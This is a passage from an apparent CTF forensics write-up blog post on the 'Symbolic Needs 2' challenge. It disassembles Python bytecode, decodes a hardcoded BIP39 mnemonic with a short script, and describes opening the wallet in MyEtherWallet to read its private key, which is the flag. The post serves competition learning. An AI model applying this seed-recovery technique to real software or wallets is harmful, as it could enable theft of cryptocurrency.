+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(dis.dis(marshal.load(f)))</span><br></pre></td></tr></table></figure>
+
+<div><figure class="highlight text" style="height: 400px; overflow: scroll; margin: 1rem 0; background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 disassembled.py 
+  1           0 LOAD_CONST               0 (0)
+              2 LOAD_CONST               1 (None)
+              4 IMPORT_NAME              0 (sys)
+              6 STORE_NAME               0 (sys)
+
+  3           8 SETUP_FINALLY            7 (to 24)
+
+  4          10 LOAD_NAME                0 (sys)
+             12 LOAD_ATTR                1 (argv)
+             14 LOAD_CONST               2 (1)
+             16 BINARY_SUBSCR
+             18 STORE_NAME               2 (password)
+             20 POP_BLOCK
+             22 JUMP_FORWARD            11 (to 46)
+
+  5     >>   24 POP_TOP
+             26 POP_TOP
+             28 POP_TOP
+
+  6          30 LOAD_NAME                3 (print)
+             32 LOAD_CONST               3 ('Usage: ./wallet password')
+             34 CALL_FUNCTION            1
+             36 POP_TOP
+
+  7          38 LOAD_NAME                4 (exit)
+             40 CALL_FUNCTION            0
+             42 POP_TOP
+             44 POP_EXCEPT
+
+ 10     >>   46 BUILD_LIST               0
+             48 STORE_NAME               5 (words)
+
+ 12          50 LOAD_NAME                6 (open)
+             52 LOAD_CONST               4 ('bip39list.txt')
+             54 LOAD_CONST               5 ('r')
+             56 CALL_FUNCTION            2
+             58 SETUP_WITH              14 (to 88)
+             60 STORE_NAME               7 (f)
+
+ 13          62 LOAD_NAME                7 (f)
+             64 LOAD_METHOD              8 (read)
+             66 CALL_METHOD              0
+             68 LOAD_METHOD              9 (splitlines)
+             70 CALL_METHOD              0
+             72 STORE_NAME               5 (words)
+             74 POP_BLOCK
+
+ 12          76 LOAD_CONST               1 (None)
+             78 DUP_TOP
+             80 DUP_TOP
+             82 CALL_FUNCTION            3
+             84 POP_TOP
+             86 JUMP_FORWARD             8 (to 104)
+        >>   88 WITH_EXCEPT_START
+             90 POP_JUMP_IF_TRUE        47 (to 94)
+             92 RERAISE                  1
+        >>   94 POP_TOP
+             96 POP_TOP
+             98 POP_TOP
+            100 POP_EXCEPT
+            102 POP_TOP
+
+ 15     >>  104 LOAD_CONST               6 (75673125099835840306362297188218306412669859836254678874904603942583570317024638985472)
+            106 STORE_NAME              10 (code)
+
+ 18         108 LOAD_NAME               11 (bin)
+            110 LOAD_NAME               10 (code)
+            112 CALL_FUNCTION            1
+            114 LOAD_CONST               7 (2)
+            116 LOAD_CONST               1 (None)
+            118 BUILD_SLICE              2
+            120 BINARY_SUBSCR
+            122 STORE_NAME              10 (code)
+
+ 19         124 LOAD_NAME               12 (str)
+            126 LOAD_NAME               10 (code)
+            128 LOAD_METHOD             13 (zfill)
+            130 LOAD_NAME               14 (len)
+            132 LOAD_NAME               10 (code)
+            134 CALL_FUNCTION            1
+            136 LOAD_CONST               8 (12)
+            138 LOAD_NAME               14 (len)
+            140 LOAD_NAME               10 (code)
+            142 CALL_FUNCTION            1
+            144 LOAD_CONST               8 (12)
+            146 BINARY_MODULO
+            148 BINARY_SUBTRACT
+            150 BINARY_ADD
+            152 CALL_METHOD              1
+            154 CALL_FUNCTION            1
+            156 STORE_NAME              10 (code)
+
+ 22         158 BUILD_LIST               0
+            160 STORE_NAME              15 (mnemonic)
+
+ 24         162 LOAD_NAME               16 (range)
+            164 LOAD_CONST               0 (0)
+            166 LOAD_NAME               14 (len)
+            168 LOAD_NAME               10 (code)
+            170 CALL_FUNCTION            1
+            172 LOAD_CONST               8 (12)
+            174 CALL_FUNCTION            3
+            176 GET_ITER
+        >>  178 FOR_ITER                20 (to 220)
+            180 STORE_NAME              17 (i)
+
+ 25         182 LOAD_NAME               15 (mnemonic)
+            184 LOAD_METHOD             18 (append)
+            186 LOAD_NAME                5 (words)
+            188 LOAD_NAME               19 (int)
+            190 LOAD_NAME               10 (code)
+            192 LOAD_NAME               17 (i)
+            194 LOAD_NAME               17 (i)
+            196 LOAD_CONST               8 (12)
+            198 BINARY_ADD
+            200 BUILD_SLICE              2
+            202 BINARY_SUBSCR
+            204 LOAD_CONST               7 (2)
+            206 CALL_FUNCTION            2
+            208 LOAD_CONST               2 (1)
+            210 BINARY_SUBTRACT
+            212 BINARY_SUBSCR
+            214 CALL_METHOD              1
+            216 POP_TOP
+            218 JUMP_ABSOLUTE           89 (to 178)
+
+ 27     >>  220 LOAD_NAME                3 (print)
+            222 LOAD_CONST               9 ('Wrong')
+            224 CALL_FUNCTION            1
+            226 POP_TOP
+            228 LOAD_CONST               1 (None)
+            230 RETURN_VALUE
+None</pre></td></tr></table></div>
+
+<p>Let’s analyze this:</p>
+<ol>
+<li>The program loads the <a target="_blank" rel="noopener" href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt"><code>bip39</code></a> wordlist. It’s a standard wordlist used to secure crypto wallets with a mnemonic.</li>
+<li>It then stores a hardcoded integer in the variable <code>code</code>, converts to binary and <code>zfill</code>s it so that length is multiple of 12.</li>
+<li>Next, it converts each 12 bits to decimal, and subtracts one. This number is used as an index, and appends the corresponding word from <code>bip39</code> in an array called <code>mnemonic</code>.</li>
+<li>No matter what, the code will always print “Wrong”! :D</li>
+</ol>
+<p>Let’s write a simple script to find the mnemonics with this information:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bip39list.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    words = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">code = <span class="number">75673125099835840306362297188218306412669859836254678874904603942583570317024638985472</span></span><br><span class="line">code = <span class="built_in">bin</span>(code)[<span class="number">2</span>:]</span><br><span class="line">code = <span class="built_in">str</span>(code.zfill(<span class="built_in">len</span>(code) + (<span class="number">12</span> - <span class="built_in">len</span>(code) % <span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">mnemonic = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">12</span>):</span><br><span class="line">    mnemonic.append(words[<span class="built_in">int</span>(code[i:i + <span class="number">12</span>], <span class="number">2</span>) - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mnemonic)</span><br></pre></td></tr></table></figure>
+
+<p>Running the script:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 mnemonic.py
+['evidence', 'leopard', 'solution', 'layer', 'legend', 'danger', 'orient', 'project', 'silver', 'flower', 'wrong', 'path', 'stove', 'throw', 'fortune', 'report', 'nuclear', 'old', 'target', 'exact', 'broom', 'hawk', 'toss', 'paper']</pre></td></tr></table></div>
+
+<p>Looks like we’ve got our mnemonic!</p>
+<p>Now we can visit <a target="_blank" rel="noopener" href="https://www.myetherwallet.com/wallet/access/software?type=mnemonic">MyEtherWallet</a> and enter the 24-word mnemonic phrase. Look for the <code>0xACa5872e497F0Cc626d1E9bA28bAEC149315266e</code> wallet and gain access to the dashboard:</p>
+<p><img src="/static/sekaictf-2022/dashboard.png" alt="MEW dashboard"></p>
+<p>To access the private key, go to <code>My personal account</code> -&gt; <code>View paper wallet</code>:</p>
+<p><img src="/static/sekaictf-2022/wallet.png" alt="Viewing wallet"></p>
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>Symbolic Needs 2</strong>: <code>SEKAI{0x81c458e9fae445de18385a3379513acc8e191e4c2667c85aa0a52a32ec4e6d55}</code></div>
+
+<hr>
+<img src="https://s01.flagcounter.com/count2/8Xkk/bg_161616/txt_C9CACC/border_E9D3B6/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/">
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/articles/">posts</a></li>
+         
+          <li><a href="/ctfs/">ctfs</a></li>
+         
+          <li><a href="/profiles/">profiles</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Infection-1"><span class="toc-number"></span> <span class="toc-text">Blind Infection 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Document-Recovery"><span class="toc-number">2.</span> <span class="toc-text">Document Recovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Infection-2"><span class="toc-number"></span> <span class="toc-text">Blind Infection 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-SQL-Rabbit-Hole"><span class="toc-number">1.</span> <span class="toc-text">The SQL Rabbit Hole</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Broken-Converter"><span class="toc-number"></span> <span class="toc-text">Broken Converter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-Mono"><span class="toc-number"></span> <span class="toc-text">flag Mono</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Symbolic-Needs-1"><span class="toc-number"></span> <span class="toc-text">Symbolic Needs 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Symbolic-Needs-2"><span class="toc-number"></span> <span class="toc-text">Symbolic Needs 2</span></a>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&text=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&title=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&is_video=false&description=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SekaiCTF 2022: Forensics Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&title=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&name=SekaiCTF 2022: Forensics Writeup Compilation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
+        
+            <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+          
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    enscribe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
